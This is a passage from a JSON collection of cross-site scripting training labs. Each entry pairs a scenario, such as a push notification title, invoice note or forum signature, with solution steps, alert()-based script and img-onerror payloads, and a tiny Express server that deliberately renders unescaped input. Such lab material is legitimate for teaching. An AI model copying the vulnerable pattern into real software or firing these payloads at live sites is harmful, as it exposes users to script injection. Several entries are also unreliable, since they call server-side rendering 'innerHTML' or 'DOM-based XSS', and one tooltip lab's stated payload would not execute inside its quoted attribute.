    "Lab Description": "Admins can create push notifications. If the title is displayed using innerHTML in the web version, an XSS attack can be triggered.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set notification title to <img src=x onerror=alert(1)>",
      "Open web notifications page",
      "Payload executes immediately"
    ],
    "payloads": [
      "<script>alert('pushXSS')</script>",
      "<img src=x onerror=alert('notify')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet notif = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-notif', (req, res) => { notif = req.body.title; res.redirect('/notifications'); });\napp.get('/notifications', (req, res) => { res.send(`<html><body><h4>${notif}</h4></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via address book contact nickname",
    "Lab Description": "Users can set nicknames for contacts in their address book. These nicknames are rendered in the UI using innerHTML. XSS occurs if input is not sanitized.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add contact nickname: <script>alert(1)</script>",
      "Visit address book",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('contactXSS')</script>",
      "<img src=x onerror=alert('contact')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet nick = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-contact', (req, res) => { nick = req.body.nick; res.redirect('/contacts'); });\napp.get('/contacts', (req, res) => { res.send(`<html><body><span>${nick}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via conference attendee badge title",
    "Lab Description": "Attendees can enter a badge title. This title is rendered in the live event viewer using innerHTML. XSS is possible if not sanitized.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set badge title: <script>alert('XSS')</script>",
      "View attendee page",
      "Script executes from badge rendering"
    ],
    "payloads": [
      "<script>alert('badgeXSS')</script>",
      "<img src=x onerror=alert('attendee')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet badge = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/register', (req, res) => { badge = req.body.title; res.redirect('/attendees'); });\napp.get('/attendees', (req, res) => { res.send(`<html><body><h2>${badge}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom reaction label in messaging platform",
    "Lab Description": "Users can add custom labels to emoji reactions. Labels are rendered in tooltips via innerHTML. A crafted label can lead to DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Add reaction label: <img src=x onerror=alert(1)>",
      "Hover over emoji in a chat",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('emojiLabelXSS')</script>",
      "<img src=x onerror=alert('emoji')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/label-reaction', (req, res) => { label = req.body.label; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><span title='${label}'>🔥</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via playlist description in music app",
    "Lab Description": "Users can add descriptions to their music playlists. These are rendered in the app UI using innerHTML. If not escaped, a malicious description can cause XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set description: <img src=x onerror=alert('XSS')>",
      "Open playlist page",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('musicXSS')</script>",
      "<img src=x onerror=alert('desc')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-description', (req, res) => { desc = req.body.desc; res.redirect('/playlist'); });\napp.get('/playlist', (req, res) => { res.send(`<html><body><p>${desc}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via virtual classroom whiteboard notes",
    "Lab Description": "Teachers can push quick notes to a virtual whiteboard. These notes are rendered in student browsers using innerHTML. A malicious note results in stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post note: <script>alert('XSS')</script>",
      "Students load whiteboard",
      "Payload executes in whiteboard area"
    ],
    "payloads": [
      "<script>alert('whiteboardXSS')</script>",
      "<img src=x onerror=alert('board')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/post-note', (req, res) => { note = req.body.note; res.redirect('/classroom'); });\napp.get('/classroom', (req, res) => { res.send(`<html><body><div>${note}</div></body></html>`); });\napp.listen(3000);"
  },

  {
    "Lab scenario": "XSS via live chat channel topic",
    "Lab Description": "Users can set topics for chat channels. These topics are rendered in the chat header using innerHTML. If unsanitized, a crafted topic results in persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set chat topic to <img src=x onerror=alert(1)>",
      "Join the channel",
      "Script executes in channel topic banner"
    ],
    "payloads": [
      "<script>alert('chatTopicXSS')</script>",
      "<img src=x onerror=alert('chat')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet topic = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-topic', (req, res) => { topic = req.body.topic; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><h1>${topic}</h1></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via expense report note field",
    "Lab Description": "Employees can attach notes to expense reports. These notes are rendered in finance dashboards using innerHTML. A malicious note can cause stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a note with: <script>alert('XSS')</script>",
      "Open expense overview as finance user",
      "Payload executes in note preview"
    ],
    "payloads": [
      "<script>alert('expenseXSS')</script>",
      "<img src=x onerror=alert('note')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { note = req.body.note; res.redirect('/expenses'); });\napp.get('/expenses', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via smart device custom label in IoT platform",
    "Lab Description": "Users can rename their devices. Labels are rendered via innerHTML in dashboards. A crafted name leads to XSS when the device is displayed.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Name device: <script>alert('XSS')</script>",
      "Visit IoT dashboard",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('deviceLabelXSS')</script>",
      "<img src=x onerror=alert('iot')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/rename-device', (req, res) => { label = req.body.label; res.redirect('/devices'); });\napp.get('/devices', (req, res) => { res.send(`<html><body><h3>${label}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via e-learning quiz question field",
    "Lab Description": "Instructors can create custom quiz questions. If these are rendered with innerHTML, a malicious question text can result in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a quiz question: <script>alert(1)</script>",
      "Student opens the quiz",
      "Payload executes in question box"
    ],
    "payloads": [
      "<script>alert('quizXSS')</script>",
      "<img src=x onerror=alert('quiz')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet question = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-question', (req, res) => { question = req.body.text; res.redirect('/quiz'); });\napp.get('/quiz', (req, res) => { res.send(`<html><body><div>${question}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via booking confirmation message",
    "Lab Description": "Users receive confirmation messages for bookings. These are constructed with innerHTML using submitted notes. A crafted note can trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit booking with message: <script>alert('XSS')</script>",
      "Receive confirmation page",
      "Script executes from note"
    ],
    "payloads": [
      "<script>alert('bookingXSS')</script>",
      "<img src=x onerror=alert('confirm')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet message = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/book', (req, res) => { message = req.body.note; res.redirect('/confirmation'); });\napp.get('/confirmation', (req, res) => { res.send(`<html><body><p>${message}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via project tag in team management tool",
    "Lab Description": "Project managers can add custom tags to projects. Tags are displayed using innerHTML. If unsanitized, a crafted tag causes XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Add tag: <img src=x onerror=alert('XSS')>",
      "Open project dashboard",
      "Observe XSS in tag display"
    ],
    "payloads": [
      "<script>alert('projectTagXSS')</script>",
      "<img src=x onerror=alert('tag')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-tag', (req, res) => { tag = req.body.tag; res.redirect('/projects'); });\napp.get('/projects', (req, res) => { res.send(`<html><body><div>${tag}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via digital signature name in approval system",
    "Lab Description": "Users sign documents with a typed signature. The name is rendered using innerHTML in the final preview. A crafted name triggers XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Sign document with: <script>alert(1)</script>",
      "Download or preview signed file",
      "Payload executes in document preview"
    ],
    "payloads": [
      "<script>alert('signatureXSS')</script>",
      "<img src=x onerror=alert('sign')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet sign = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/sign', (req, res) => { sign = req.body.name; res.redirect('/preview'); });\napp.get('/preview', (req, res) => { res.send(`<html><body><footer>${sign}</footer></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via bug tracker issue label",
    "Lab Description": "Developers can label issues with custom text. If rendered via innerHTML, a crafted label causes stored XSS in the issue list.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create label: <img src=x onerror=alert('XSS')>",
      "View issue list",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('issueLabelXSS')</script>",
      "<img src=x onerror=alert('bug')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-label', (req, res) => { label = req.body.label; res.redirect('/issues'); });\napp.get('/issues', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via vehicle nickname in fleet management",
    "Lab Description": "Admins can assign nicknames to vehicles. These are rendered in dashboards via innerHTML. If unsanitized, XSS occurs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set nickname: <img src=x onerror=alert(1)>",
      "Visit fleet page",
      "Observe XSS on render"
    ],
    "payloads": [
      "<script>alert('vehicleXSS')</script>",
      "<img src=x onerror=alert('fleet')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet name = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-nickname', (req, res) => { name = req.body.name; res.redirect('/fleet'); });\napp.get('/fleet', (req, res) => { res.send(`<html><body><td>${name}</td></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via featured review title on product page",
    "Lab Description": "Top reviews are highlighted with a custom title. If rendered unsanitized using innerHTML, XSS occurs on product detail view.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit review title: <script>alert('XSS')</script>",
      "Product page loads with featured review",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('reviewXSS')</script>",
      "<img src=x onerror=alert('review')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => { title = req.body.title; res.redirect('/product'); });\napp.get('/product', (req, res) => { res.send(`<html><body><h3>${title}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via invoice note in billing platform",
    "Lab Description": "Clients can attach notes to invoices. These notes are displayed in the client portal using innerHTML. If unsanitized, the note can cause stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit invoice with note: <img src=x onerror=alert('XSS')>",
      "Open invoice in client portal",
      "Payload executes in note section"
    ],
    "payloads": [
      "<script>alert('invoiceXSS')</script>",
      "<img src=x onerror=alert('bill')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-invoice', (req, res) => { note = req.body.note; res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via newsletter campaign name",
    "Lab Description": "Marketing teams can name newsletter campaigns. Campaign names appear in the dashboard via innerHTML. Malicious names trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create campaign named: <script>alert('XSS')</script>",
      "Visit newsletter dashboard",
      "Observe script execution in campaign list"
    ],
    "payloads": [
      "<script>alert('newsletterXSS')</script>",
      "<img src=x onerror=alert('mail')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet campaign = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/new-campaign', (req, res) => { campaign = req.body.name; res.redirect('/campaigns'); });\napp.get('/campaigns', (req, res) => { res.send(`<html><body><div>${campaign}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via virtual event room name",
    "Lab Description": "Event organizers can name virtual rooms. These names are reflected into the frontend using innerHTML. A malicious name results in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create room with name: <img src=x onerror=alert('XSS')>",
      "Join virtual event",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('roomXSS')</script>",
      "<img src=x onerror=alert('virtual')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet room = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-room', (req, res) => { room = req.body.name; res.redirect('/event'); });\napp.get('/event', (req, res) => { res.send(`<html><body><h2>${room}</h2></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via book title in online library system",
    "Lab Description": "Admins can add books with custom titles. These are rendered via innerHTML on the catalog page. Unsanitized input causes XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Add book: <img src=x onerror=alert(1)>",
      "Visit catalog",
      "Script executes on book listing"
    ],
    "payloads": [
      "<script>alert('bookXSS')</script>",
      "<img src=x onerror=alert('read')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet book = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-book', (req, res) => { book = req.body.title; res.redirect('/library'); });\napp.get('/library', (req, res) => { res.send(`<html><body><li>${book}</li></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via system announcement title",
    "Lab Description": "Admins can post announcements. The title is displayed on the homepage using innerHTML. If not sanitized, XSS occurs for all users.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post announcement titled: <script>alert('XSS')</script>",
      "View homepage",
      "Observe script execution from title"
    ],
    "payloads": [
      "<script>alert('announcementXSS')</script>",
      "<img src=x onerror=alert('announce')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/announce', (req, res) => { title = req.body.title; res.redirect('/'); });\napp.get('/', (req, res) => { res.send(`<html><body><h1>${title}</h1></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via travel itinerary stop name",
    "Lab Description": "Users can build travel itineraries with named stops. These names are rendered in the app using innerHTML. A crafted name results in XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add stop: <img src=x onerror=alert('XSS')>",
      "Open itinerary view",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('tripXSS')</script>",
      "<img src=x onerror=alert('stop')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet stop = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-stop', (req, res) => { stop = req.body.name; res.redirect('/itinerary'); });\napp.get('/itinerary', (req, res) => { res.send(`<html><body><ul><li>${stop}</li></ul></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via personal goal title in productivity tracker",
    "Lab Description": "Users can set personal goals with titles. Titles are rendered in goal overviews using innerHTML. Malicious input leads to stored XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create goal: <img src=x onerror=alert('XSS')>",
      "View goals list",
      "Script executes from title"
    ],
    "payloads": [
      "<script>alert('goalXSS')</script>",
      "<img src=x onerror=alert('goal')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet goal = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-goal', (req, res) => { goal = req.body.title; res.redirect('/goals'); });\napp.get('/goals', (req, res) => { res.send(`<html><body><h3>${goal}</h3></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via virtual workspace tab name",
    "Lab Description": "Users can create tabs within their workspace. Tab names are displayed in the interface using innerHTML. A malicious name causes DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Name a tab: <img src=x onerror=alert(1)>",
      "Open the tab interface",
      "Observe payload execution"
    ],
    "payloads": [
      "<script>alert('workspaceXSS')</script>",
      "<img src=x onerror=alert('tab')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tab = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-tab', (req, res) => { tab = req.body.name; res.redirect('/workspace'); });\napp.get('/workspace', (req, res) => { res.send(`<html><body><div>${tab}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via clinic appointment reason text",
    "Lab Description": "Patients can provide appointment reasons. These are rendered in the doctor dashboard using innerHTML. XSS is possible if unsanitized.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit reason: <img src=x onerror=alert('XSS')>",
      "Doctor opens appointments list",
      "Payload executes in reason field"
    ],
    "payloads": [
      "<script>alert('clinicXSS')</script>",
      "<img src=x onerror=alert('appt')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet reason = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/book-appointment', (req, res) => { reason = req.body.reason; res.redirect('/appointments'); });\napp.get('/appointments', (req, res) => { res.send(`<html><body><td>${reason}</td></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via warehouse product bin label",
    "Lab Description": "Warehouse managers can label storage bins. Labels are rendered via innerHTML in the inventory app. A malicious label can cause XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Label bin: <img src=x onerror=alert('XSS')>",
      "Open inventory viewer",
      "Observe script execution in bin area"
    ],
    "payloads": [
      "<script>alert('warehouseXSS')</script>",
      "<img src=x onerror=alert('bin')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/label-bin', (req, res) => { label = req.body.label; res.redirect('/inventory'); });\napp.get('/inventory', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via forum signature field",
    "Lab Description": "Users can add signatures to their forum profiles. These are displayed under every post using innerHTML. A malicious signature causes stored XSS on every thread visit.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set forum signature: <img src=x onerror=alert('XSS')>",
      "Post in any thread",
      "View thread and observe script execution"
    ],
    "payloads": [
      "<script>alert('forumXSS')</script>",
      "<img src=x onerror=alert('signature')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet signature = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-signature', (req, res) => { signature = req.body.text; res.redirect('/thread'); });\napp.get('/thread', (req, res) => { res.send(`<html><body><div>${signature}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via peer review comment title",
    "Lab Description": "Students can leave peer reviews with custom titles. These titles are rendered in the review summary using innerHTML. A crafted title results in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit review with title: <script>alert('XSS')</script>",
      "View the peer review page",
      "Payload executes in review summary"
    ],
    "payloads": [
      "<script>alert('peerReviewXSS')</script>",
      "<img src=x onerror=alert('peer')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet review = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => { review = req.body.title; res.redirect('/reviews'); });\napp.get('/reviews', (req, res) => { res.send(`<html><body><h4>${review}</h4></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via emergency alert title in control dashboard",
    "Lab Description": "Admins can broadcast emergency alerts. Alert titles are rendered with innerHTML in a dashboard. If unsanitized, this results in XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Broadcast alert titled: <img src=x onerror=alert('XSS')>",
      "Open live alert dashboard",
      "Observe XSS execution from alert title"
    ],
    "payloads": [
      "<script>alert('alertXSS')</script>",
      "<img src=x onerror=alert('emergency')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet alert = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/broadcast-alert', (req, res) => { alert = req.body.title; res.redirect('/alerts'); });\napp.get('/alerts', (req, res) => { res.send(`<html><body><div>${alert}</div></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via code snippet title in sharing platform",
    "Lab Description": "Users can share code snippets with titles. These titles are shown in listings using innerHTML. A malicious title results in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit snippet titled: <script>alert('XSS')</script>",
      "Visit snippet browser",
      "Script executes from title listing"
    ],
    "payloads": [
      "<script>alert('snippetXSS')</script>",
      "<img src=x onerror=alert('code')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-snippet', (req, res) => { title = req.body.title; res.redirect('/snippets'); });\napp.get('/snippets', (req, res) => { res.send(`<html><body><p>${title}</p></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via bug bounty report summary",
    "Lab Description": "Researchers submit summaries for their bug reports. These are displayed to the security team using innerHTML. Unsanitized input leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit report summary: <script>alert('XSS')</script>",
      "Security team opens reports dashboard",
      "Observe script execution from summary"
    ],
    "payloads": [
      "<script>alert('bugXSS')</script>",
      "<img src=x onerror=alert('report')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet summary = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-report', (req, res) => { summary = req.body.summary; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><section>${summary}</section></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via comment section username",
    "Lab Description": "Usernames are displayed beside comments using innerHTML. If usernames are not sanitized, stored XSS can be executed by simply posting a comment.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set your username to <script>alert('XSS')</script>",
      "Post a comment",
      "Visit comment section and observe XSS"
    ],
    "payloads": [
      "<script>alert('usernameXSS')</script>",
      "<img src=x onerror=alert('name')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet username = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-username', (req, res) => { username = req.body.username; res.redirect('/comment'); });\napp.get('/comment', (req, res) => { res.send(`<html><body><b>${username}</b>: Nice post!</body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via product category name in inventory app",
    "Lab Description": "Admins can create custom product categories. Category names appear in dropdowns using innerHTML. A malicious name results in DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create category: <img src=x onerror=alert(1)>",
      "Open category dropdown",
      "Script executes immediately"
    ],
    "payloads": [
      "<script>alert('categoryXSS')</script>",
      "<img src=x onerror=alert('product')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet category = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-category', (req, res) => { category = req.body.name; res.redirect('/inventory'); });\napp.get('/inventory', (req, res) => { res.send(`<html><body><option>${category}</option></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via meeting agenda point in scheduler",
    "Lab Description": "Team leads can set meeting points. Points are rendered via innerHTML in the scheduler. A crafted point triggers XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add agenda point: <script>alert('XSS')</script>",
      "Visit meeting summary",
      "Observe script execution"
    ],
    "payloads": [
      "<script>alert('agendaXSS')</script>",
      "<img src=x onerror=alert('meeting')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet agenda = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-agenda', (req, res) => { agenda = req.body.point; res.redirect('/summary'); });\napp.get('/summary', (req, res) => { res.send(`<html><body><li>${agenda}</li></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via log entry detail field in admin panel",
    "Lab Description": "Log entries include a user-supplied detail field. These are rendered using innerHTML in the admin log viewer. Unsanitized values allow stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger a log with detail: <img src=x onerror=alert(1)>",
      "Admin opens log viewer",
      "Observe script execution from logs"
    ],
    "payloads": [
      "<script>alert('logXSS')</script>",
      "<img src=x onerror=alert('log')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet detail = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/log', (req, res) => { detail = req.body.detail; res.redirect('/logs'); });\napp.get('/logs', (req, res) => { res.send(`<html><body><pre>${detail}</pre></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via AI assistant custom command label",
    "Lab Description": "Users can name their custom AI assistant commands. These names are rendered using innerHTML in the assistant UI. A malicious name results in stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add command label: <script>alert('XSS')</script>",
      "Open AI assistant interface",
      "Observe XSS in command list"
    ],
    "payloads": [
      "<script>alert('aiXSS')</script>",
      "<img src=x onerror=alert('command')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-command', (req, res) => { label = req.body.label; res.redirect('/assistant'); });\napp.get('/assistant', (req, res) => { res.send(`<html><body><button>${label}</button></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via contact form department selector label",
    "Lab Description": "The contact form dynamically displays the selected department name using innerHTML. A maliciously crafted department name can lead to DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject malicious department name via URL or intercepted request",
      "Load the contact form and observe execution",
      "Verify script is executed inside selector label"
    ],
    "payloads": [
      "<script>alert('deptXSS')</script>",
      "<img src=x onerror=alert('dept')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/contact', (req, res) => {\n  const dept = req.query.department || 'Support';\n  res.send(`<html><body><label>Department: ${dept}</label></body></html>`);\n});\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via chatbot suggested reply label",
    "Lab Description": "The chatbot suggests reply labels, generated from prior messages. These are inserted into the page using innerHTML. Malicious content can cause XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject a crafted message: <img src=x onerror=alert('XSS')>",
      "Trigger suggestion rendering",
      "Observe payload execution inside button"
    ],
    "payloads": [
      "<script>alert('chatXSS')</script>",
      "<img src=x onerror=alert('bot')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet suggestion = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/message', (req, res) => { suggestion = req.body.message; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><button>${suggestion}</button></body></html>`); });\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via audio track title in music playlist viewer",
    "Lab Description": "Users can add audio tracks with custom titles. These titles appear in playlists using innerHTML. A malicious title results in stored XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Add track: <script>alert('XSS')</script>",
      "View the playlist",
      "Observe execution from track title"
    ],
    "payloads": [
      "<script>alert('trackXSS')</script>",
      "<img src=x onerror=alert('audio')>"
    ],
    "Vulnerability name": "Cross-site scripting",
